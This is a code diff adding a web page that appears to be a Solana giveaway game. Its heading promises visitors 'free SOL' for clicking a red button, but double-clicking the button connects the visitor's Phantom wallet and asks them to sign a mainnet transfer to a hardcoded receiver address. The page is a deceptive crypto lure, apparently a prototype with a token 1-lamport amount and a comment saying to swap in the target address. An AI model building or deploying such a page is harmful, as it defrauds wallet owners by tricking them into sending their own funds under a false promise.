@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Solana Transaction Test</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    #redSquare {
+      position: fixed;
+      bottom: 45%;
+      left: 94%;
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Click the red button as fast as you can to win free SOL!</h2>
+  <p id="status">Not connected</p>
+  <div id="redSquare" title="Double-click to send transaction"></div>
+
+  <script>
+    const receiverAddress = "Fg6PaFpoGXkYsidMpWxTWqT6nR6UheUeVHzy7DkZGxYf"; // Ganti dengan alamat Solana tujuan
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+
+    async function connectPhantom() {
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          const resp = await window.solana.connect();
+          document.getElementById("status").innerText = "Connected: " + resp.publicKey.toString();
+          return resp.publicKey;
+        } catch (err) {
+          console.error(err);
+          alert("Connection rejected.");
+        }
+      } else {
+        alert("Please install Phantom Wallet.");
+      }
+    }
+
+    async function sendSolTransaction() {
+      const sender = await connectPhantom();
+      if (!sender) return;
+
+      const receiver = new solanaWeb3.PublicKey(receiverAddress);
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: sender,
+          toPubkey: receiver,
+          lamports: 1, // 1 lamport = 0.000000001 SOL
+        })
+      );
+
+      transaction.feePayer = sender;
+      const { blockhash } = await connection.getRecentBlockhash();
+      transaction.recentBlockhash = blockhash;
+
+      try {
+        const signed = await window.solana.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
+        alert("Transaction successful! Signature: " + signature);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed or rejected.");
+      }
+    }
+
+    document.getElementById("redSquare").addEventListener("dblclick", sendSolTransaction);
+  </script>
+
+</body>
+</html>
